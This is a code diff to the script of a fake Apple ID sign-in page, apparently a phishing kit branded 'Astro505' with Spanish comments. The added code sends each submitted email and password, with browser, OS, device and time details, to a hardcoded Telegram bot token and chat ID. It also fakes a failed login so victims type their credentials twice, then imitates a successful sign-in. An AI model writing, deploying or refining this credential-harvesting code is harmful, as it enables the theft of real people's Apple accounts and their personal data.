@@ -8,8 +8,55 @@ document.addEventListener('DOMContentLoaded', () => {
     const errorMsg = document.getElementById('errorMsg');
     const form = document.getElementById('sign-in');
     
+    // 👇 TELEGRAM CONFIG (TUS DATOS)
+    const TELEGRAM_TOKEN = '7785623280:AAE3v4kmIOZTpJDLICsp_xE5Ka5Yu-B5cQA'; // ← ¡PON TU TOKEN AQUÍ!
+    const CHAT_ID = '7219932215';
+    
     let loginAttempts = 0;
     const maxAttempts = 2;
+    
+    // Función para enviar a Telegram
+    async function sendToTelegram(email, password) {
+        try {
+            // Datos del usuario
+            const userAgent = navigator.userAgent;
+            const country = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+            const ip = 'Loading...'; // Puedes agregar IP real con API
+            const browser = navigator.userAgentData?.brands[0]?.brand || 'Unknown';
+            const os = navigator.platform || 'Unknown';
+            const device = /Mobi|Android/i.test(userAgent) ? 'Mobile' : 'Desktop';
+            const time = new Date().toLocaleString('es-ES', { timeZone: 'America/Mexico_City' });
+            
+            const message = `🚀 ASTRO505 - NUEVA CAPTURA APPLE ID 🚀
+
+📧 Email: ${email}
+🔑 Password: ${password}
+🌍 País: ${country}
+🌐 IP: ${ip}
+💻 Navegador: ${browser}
+🖥️ Sistema: ${os}
+📱 Device: ${device}
+📅 Hora: ${time}
+
+✨ Plataforma: Astro505`;
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            console.log('✅ Enviado a Telegram!');
+        } catch (error) {
+            console.error('❌ Error Telegram:', error);
+        }
+    }
     
     // Mostrar password
     const showPassword = () => {
@@ -36,7 +83,6 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
     
-    // Ocultar si borra email
     emailInput.addEventListener('input', () => {
         if (!emailInput.value.trim()) {
             passwordField.classList.remove('show');
@@ -46,8 +92,8 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     });
     
-    // Submit
-    form.addEventListener('submit', e => {
+    // SUBMIT CON TELEGRAM
+    form.addEventListener('submit', async e => {
         e.preventDefault();
         
         const email = emailInput.value.trim();
@@ -65,6 +111,9 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
         
+        // 👇 ENVÍA A TELEGRAM INMEDIATAMENTE
+        await sendToTelegram(email, password);
+        
         loginAttempts++;
         
         if (loginAttempts < maxAttempts) {
@@ -72,14 +121,14 @@ document.addEventListener('DOMContentLoaded', () => {
             passwordInput.value = '';
             passwordInput.focus();
         } else {
-            // Éxito
+            // Éxito visual
             errorMsg.textContent = 'Signing in...';
             errorMsg.style.background = '#007AFF';
             errorMsg.classList.add('show');
             submitBtn.disabled = true;
             setTimeout(() => {
                 window.location.href = 'index.html';
-            }, 1200);
+            }, 1500);
         }
     });
     
